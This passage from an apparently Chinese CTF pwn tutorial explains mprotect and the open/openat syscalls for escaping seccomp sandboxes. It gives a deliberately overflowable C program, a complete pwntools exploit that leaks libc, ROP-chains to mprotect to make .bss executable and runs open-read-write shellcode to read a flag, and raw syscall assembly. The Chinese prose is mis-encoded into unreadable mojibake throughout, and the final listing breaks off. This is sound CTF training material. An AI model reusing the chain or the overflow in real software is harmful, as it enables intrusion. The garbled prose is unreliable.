ˆä¸Šï¼Œæˆ–è€…å†™å…¥ä¸€ä¸ªbssæ®µï¼Œç„¶åå‡½æ•°ä¼šè‡ªåŠ¨è·³è½¬å»å®ç°ï¼Œä½†æ˜¯å¦‚æœå¼€å¯äº†NXä¿æŠ¤ä¸”åªå…è®¸ä½ å¾€æ ˆä¸Šå†™å…¥æ•°æ®ï¼Œé‚£ä½ ä¸ç‚¸äº†å—ï¼Ÿ<code>å…¶å®ä¸ç„¶</code>ï¼Œå¦‚ä½•å‡ºé¢˜äººè´´å¿ƒçš„ç»™äº†ä½ <code>mmap</code>ï¼Œä½ å¯ä»¥å¾€é‚£é‡Œå†™å…¥shellcodeï¼Œç„¶åæ§åˆ¶ç¨‹åºæ‰§è¡Œæµè·³è½¬è¿‡å»æ‰§è¡Œï¼Œä¸‹é¢æ¥çœ‹çœ‹ï¼š</p><h2 id="ä¾‹é¢˜-1"><a href="#ä¾‹é¢˜-1" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p><mark><a href="http://downbeat.top/2024/09/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad">[æå®¢å¤§æŒ‘æˆ˜ 2019]Not Bad</a><mark></mark></mark></p><h1 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h1><h2 id="ä»‹ç»-1"><a href="#ä»‹ç»-1" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><ul><li><code>mprotect</code> æ˜¯ <code>mmap</code> çš„è¡¥å……ï¼Œå®ƒå…è®¸ä½ æ”¹å˜ä¸€ä¸ªå·²ç»æ˜ å°„åˆ°å†…å­˜çš„åŒºåŸŸçš„è®¿é—®æƒé™ï¼Œæ¯”å¦‚ä½¿å¾—æŸä¸ªå†…å­˜åŒºåŸŸåªè¯»ã€åªå†™ã€å¯æ‰§è¡Œç­‰ã€‚<code>mmap</code>å¼€è¾Ÿä¸€æ®µå†…å­˜æ˜ å°„ï¼Œ<code>mprotect</code>ä¿®æ”¹æŸä¸€æ®µå†…å­˜æ˜ å°„ã€‚</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure></div><h3 id="å‚æ•°è§£æ-1"><a href="#å‚æ•°è§£æ-1" class="headerlink" title="å‚æ•°è§£æ"></a>å‚æ•°è§£æ</h3><ol><li><p>**<code>addr</code>**ï¼š</p><ul><li>è¦ä¿®æ”¹ä¿æŠ¤å±æ€§çš„å†…å­˜åŒºåŸŸçš„èµ·å§‹åœ°å€ã€‚é€šå¸¸ï¼Œåœ°å€åº”å½“æ˜¯ä¸€ä¸ªé¡µé¢ï¼ˆé€šå¸¸æ˜¯ 4KB æˆ– 8KBï¼‰çš„èµ·å§‹åœ°å€ã€‚å¦‚æœ <code>addr</code> ä¸æ˜¯é¡µé¢å¯¹é½çš„ï¼Œ<code>mprotect</code> ä¼šå‘ä¸‹èˆå…¥åˆ°é¡µé¢çš„èµ·å§‹ä½ç½®ã€‚</li></ul></li><li><p>**<code>length</code>**ï¼š</p><ul><li>è¦ä¿®æ”¹ä¿æŠ¤å±æ€§çš„å†…å­˜åŒºåŸŸçš„é•¿åº¦ï¼ˆå­—èŠ‚æ•°ï¼‰ã€‚é•¿åº¦é€šå¸¸åº”æ˜¯é¡µé¢å¤§å°çš„å€æ•°ã€‚</li></ul></li><li><p>**<code>prot</code>**ï¼š</p><ul><li>æ–°çš„ä¿æŠ¤å±æ€§ã€‚å¯ä»¥æ˜¯ä»¥ä¸‹æ ‡å¿—çš„æŒ‰ä½ OR ç»“æœï¼š<ul><li><code>PROT_READ</code>ï¼šè¯¥åŒºåŸŸæ˜¯å¯è¯»çš„ã€‚</li><li><code>PROT_WRITE</code>ï¼šè¯¥åŒºåŸŸæ˜¯å¯å†™çš„ã€‚</li><li><code>PROT_EXEC</code>ï¼šè¯¥åŒºåŸŸæ˜¯å¯æ‰§è¡Œçš„ã€‚</li><li><code>PROT_NONE</code>ï¼šè¯¥åŒºåŸŸä¸å¯è®¿é—®ã€‚</li></ul></li></ul><p><code>prot</code> ç»„åˆäº†è¿™äº›æ ‡å¿—ï¼Œç”¨æ¥æŒ‡å®šè®¿é—®æƒé™ã€‚ä¾‹å¦‚ï¼Œ<code>PROT_READ | PROT_WRITE</code> è¡¨ç¤ºè¯¥åŒºåŸŸæ—¢å¯è¯»åˆå¯å†™ã€‚</p></li></ol><h3 id="é€šå¸¸ç”¨æ³•-1"><a href="#é€šå¸¸ç”¨æ³•-1" class="headerlink" title="é€šå¸¸ç”¨æ³•"></a>é€šå¸¸ç”¨æ³•</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect(addr, <span class="number">0x1000</span>, <span class="number">7</span>)</span><br></pre></td></tr></table></figure></div><h1 id><a href="#" class="headerlink" title></a></h1><h2 id="32ä½-1"><a href="#32ä½-1" class="headerlink" title="32ä½"></a>32ä½</h2><p>çœ‹æˆ‘å†™çš„è¿™ç¯‡æ–‡ç« ï¼š<a class="link" href="https://blog.csdn.net/zwb2603096342/article/details/140246412?spm=1001.2014.3001.5502">BUUCTF get_started_3dsctf_2016_buuctf get started-CSDNåšå®¢ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="64ä½-1"><a href="#64ä½-1" class="headerlink" title="64ä½"></a>64ä½</h2><h3 id="æºç ï¼š"><a href="#æºç ï¼š" class="headerlink" title="æºç ï¼š"></a>æºç ï¼š</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -g mprotect64.c -o mprotect64 -lseccomp -fno-stack-protector -no-pie</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gift</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop %rdi;&quot;</span>  </span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop %rsi;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop %rdx;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;ret;&quot;</span>         </span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),<span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    seccomp();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Give you a gift %p\n&quot;</span>,&amp;<span class="built_in">puts</span>);</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwn@ctfpwn:~/learn/Seccomp/test/mprotect_test$ checksec mprotect64</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/learn/Seccomp/test/mprotect_test/mprotect64&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000</span><br></pre></td></tr></table></figure></div><ul><li>ç›´æ¥ç»™äº†<code>putsçš„åœ°å€</code>,ç›¸å½“äºå·²ç»çŸ¥é“äº†libcï¼Œå³ä½¿å¼€äº†NXä¿æŠ¤ï¼Œæˆ‘ä»¬ç”¨<code>mprotect</code>ä¿®æ”¹æŸä¸€éƒ¨åˆ†çš„å†…å­˜æ˜ å°„ä½rwxï¼Œç„¶åå°†shellcodeå¸ƒç½®åˆ°é‚£é‡Œï¼Œä¸€æ ·å¯ä»¥get flagã€‚</li><li>é€šå¸¸å…ˆ<code>mprotect</code>ææƒï¼Œå†<code>read</code>ç›´æ¥è¯»shellcodeï¼Œç„¶åè·³è½¬æ‰§è¡Œã€‚</li></ul><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>)<span class="comment">#,log_level = &quot;debug&quot;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./mprotect64&quot;</span></span><br><span class="line"><span class="comment">#libc = &quot;./libc.so.6&quot;</span></span><br><span class="line">libc = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(file)</span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;gift &quot;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">mprotect = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">pop_rdi_rsi_rdx_ret = <span class="number">0x00000000004011fe</span></span><br><span class="line">read = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">bss = <span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;libc_address: &quot;</span>,libc.address)</span><br><span class="line">lg(<span class="string">&quot;mprotect: &quot;</span>,mprotect)</span><br><span class="line">lg(<span class="string">&quot;read: &quot;</span>,read)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,bss,<span class="number">0x30</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,bss,<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x108</span>)</span><br><span class="line">payload += flat(pop_rdi_rsi_rdx_ret,bss,<span class="number">0x1000</span>,<span class="number">7</span>,ret,mprotect)</span><br><span class="line">payload += flat(pop_rdi_rsi_rdx_ret,<span class="number">0</span>,bss+<span class="number">0x100</span>,<span class="number">0x100</span>,ret,read)</span><br><span class="line">payload += p64(bss+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sd(payload)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">sd(asm(shellcode))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure></div><ul><li>æ•ˆæœï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241114205628159.bmp"></p><h1 id="ä¸‰ç§opençš„ä»‹ç»"><a href="#ä¸‰ç§opençš„ä»‹ç»" class="headerlink" title="ä¸‰ç§opençš„ä»‹ç»"></a>ä¸‰ç§opençš„ä»‹ç»</h1><h2 id="open"><a href="#open" class="headerlink" title="open"></a>open</h2><ul><li>ä¹‹å‰ä¸€ç›´ç”¨çš„éƒ½æ˜¯è¯¥å‡½æ•°ï¼Œè¿™é‡Œè¿˜æ˜¯æä¸€å˜´å§</li></ul><h3 id="open-ç³»ç»Ÿè°ƒç”¨"><a href="#open-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="open ç³»ç»Ÿè°ƒç”¨"></a><strong><code>open</code> ç³»ç»Ÿè°ƒç”¨</strong></h3><p><code>open</code> ç³»ç»Ÿè°ƒç”¨çš„ Linux x86_64 ç‰ˆæœ¬çš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯ <code>2</code>ã€‚</p><blockquote><h4 id="ç³»ç»Ÿè°ƒç”¨å‚æ•°ï¼š"><a href="#ç³»ç»Ÿè°ƒç”¨å‚æ•°ï¼š" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨å‚æ•°ï¼š"></a>ç³»ç»Ÿè°ƒç”¨å‚æ•°ï¼š</h4><ul><li><code>rax</code>ï¼šç³»ç»Ÿè°ƒç”¨å·ï¼ˆå¯¹äº <code>open</code>ï¼Œå€¼ä¸º <code>2</code>ï¼‰ã€‚</li><li><code>rdi</code>ï¼šæ–‡ä»¶è·¯å¾„ <code>pathname</code>ï¼ˆæŒ‡å‘å­—ç¬¦ä¸²çš„æŒ‡é’ˆï¼‰ã€‚</li><li><code>rsi</code>ï¼š<code>flags</code>ï¼ˆä¾‹å¦‚ <code>O_RDONLY</code>, <code>O_WRONLY</code>ï¼‰ã€‚</li><li><code>rdx</code>ï¼š<code>mode</code>ï¼ˆä»…åœ¨æ–‡ä»¶åˆ›å»ºæ—¶ä½¿ç”¨ï¼Œä¾‹å¦‚ <code>0644</code>ï¼‰ã€‚</li></ul></blockquote><h3 id="é€šå¸¸ç”¨æ³•-2"><a href="#é€šå¸¸ç”¨æ³•-2" class="headerlink" title="é€šå¸¸ç”¨æ³•"></a>é€šå¸¸ç”¨æ³•</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push 0x67616c66;</span><br><span class="line">mov rdi, rsp;  // æ³¨æ„ä¸è¦pop, ä¸ç„¶åé¢ä¸èƒ½ç›´æ¥mov rsi, rsp;</span><br><span class="line">xor rsi, rsi;</span><br><span class="line">xor rdx, rdx;</span><br><span class="line">push 2;</span><br><span class="line">pop rax;</span><br></pre></td></tr></table></figure></div><h2 id="openat1"><a href="#openat1" class="headerlink" title="openat1"></a>openat1</h2><ul><li><code>openat</code> ç³»åˆ—å‡½æ•°æ˜¯å¯¹ <code>open</code> ç³»ç»Ÿè°ƒç”¨çš„æ‰©å±•ï¼Œå®ƒå…è®¸åœ¨æŒ‡å®šçš„ç›®å½•æ–‡ä»¶æè¿°ç¬¦ä¸‹è¿›è¡Œæ–‡ä»¶æ“ä½œã€‚<code>openat</code> çš„å¼•å…¥è§£å†³äº† <code>open</code> è°ƒç”¨ä¸èƒ½æä¾›åŸºäºç›®å½•æ–‡ä»¶æè¿°ç¬¦çš„çµæ´»æ€§é—®é¢˜ï¼Œç‰¹åˆ«æ˜¯åœ¨éœ€è¦ç›¸å¯¹è·¯å¾„æ—¶ã€‚</li><li>å‡½æ•°åŸå‹</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span>;</span><br></pre></td></tr></table></figure></div><h3 id="openat-ç³»ç»Ÿè°ƒç”¨"><a href="#openat-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="openat ç³»ç»Ÿè°ƒç”¨"></a><strong><code>openat</code> ç³»ç»Ÿè°ƒç”¨</strong></h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openat` ç³»ç»Ÿè°ƒç”¨çš„ Linux x86_64 ç‰ˆæœ¬çš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯ `257</span><br></pre></td></tr></table></figure></div><blockquote><h4 id="ç³»ç»Ÿè°ƒç”¨å‚æ•°ï¼š-1"><a href="#ç³»ç»Ÿè°ƒç”¨å‚æ•°ï¼š-1" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨å‚æ•°ï¼š"></a>ç³»ç»Ÿè°ƒç”¨å‚æ•°ï¼š</h4><ul><li><code>rax</code>ï¼šç³»ç»Ÿè°ƒç”¨å·ï¼ˆå¯¹äº <code>openat</code>ï¼Œå€¼ä¸º <code>257</code>ï¼‰ã€‚</li><li><code>rdi</code>ï¼šç›®å½•æ–‡ä»¶æè¿°ç¬¦ <code>dirfd</code>ï¼ˆä¾‹å¦‚ <code>AT_FDCWD</code>ï¼‰ã€‚</li><li><code>rsi</code>ï¼šæ–‡ä»¶è·¯å¾„ <code>pathname</code>ï¼ˆæŒ‡å‘å­—ç¬¦ä¸²çš„æŒ‡é’ˆï¼‰ã€‚</li><li><code>rdx</code>ï¼š<code>flags</code>ï¼ˆä¾‹å¦‚ <code>O_RDONLY</code>ï¼‰ã€‚</li><li><code>r10</code>ï¼š<code>mode</code>ï¼ˆä»…åœ¨åˆ›å»ºæ–‡ä»¶æ—¶ä½¿ç”¨ï¼Œé»˜è®¤ä¸º <code>0</code>ï¼‰ã€‚</li><li><code>r8</code>ï¼šè·¯å¾„è§£ææ ‡å¿—ï¼ˆé€šå¸¸ä¸º <code>0</code>ï¼‰ã€‚</li></ul></blockquote><h3 id="é€šå¸¸ç”¨æ³•-3"><a href="#é€šå¸¸ç”¨æ³•-3" class="headerlink" title="é€šå¸¸ç”¨æ³•"></a>é€šå¸¸ç”¨æ³•</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, -100              ; AT_FDCWDï¼Œ-100è¡¨ç¤ºå½“å‰ç›®å½•ï¼Œå…è®¸ä½¿ç”¨ç›¸å¯¹ç›®å½•</span><br><span class="line">mov rsi, filename          ; å°†æ–‡ä»¶è·¯å¾„ &#x27;flag&#x27; åœ°å€ä¼ ç»™ rsi</span><br><span class="line">mov rdx, 0                 ; O_RDONLYï¼Œè¡¨ç¤ºåªè¯»æ¨¡å¼</span><br><span class="line">mov r10, 0                 ; æ¨¡å¼ä½ä¸º 0ï¼Œè¡¨ç¤ºä¸åˆ›å»ºæ–‡ä»¶</span><br><span class="line">mov r8, 0                  ; è·¯å¾„è§£ææ ‡å¿—ä¸º 0</span><br><span class="line">mov rax, 257               ; ç³»ç»Ÿè°ƒç”¨å· 257 (openat)</span><br></pre></td></tr></table></figure></div><ul><li><mark>æ³¨æ„:<mark>openat1æ‰“å¼€æ–‡ä»¶ä¹‹åä¼šå°†<code>fd</code>ç»™rax</mark></mark></li></ul><h3 id="ä¾‹é¢˜-2"><a href="#ä¾‹é¢˜-2" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><p>1.è¿™ç¯‡æ–‡ç« ï¼š<a href="http://downbeat.top/2024/09/18/%E6%B2%99%E7%AE%B1%E7%A6%81%E7%94%A8ORW-BaseCTF/">http://downbeat.top/2024/09/18/%E6%B2%99%E7%AE%B1%E7%A6%81%E7%94%A8ORW-BaseCTF/</a></p><p>2.è‡ªå·±ç¼–è¯‘ï¼š</p><ul><li>æºç </li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -g openat1.c -o openat1 -fno-stack-protector -no-pie -z execstack -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),<span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open),<span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    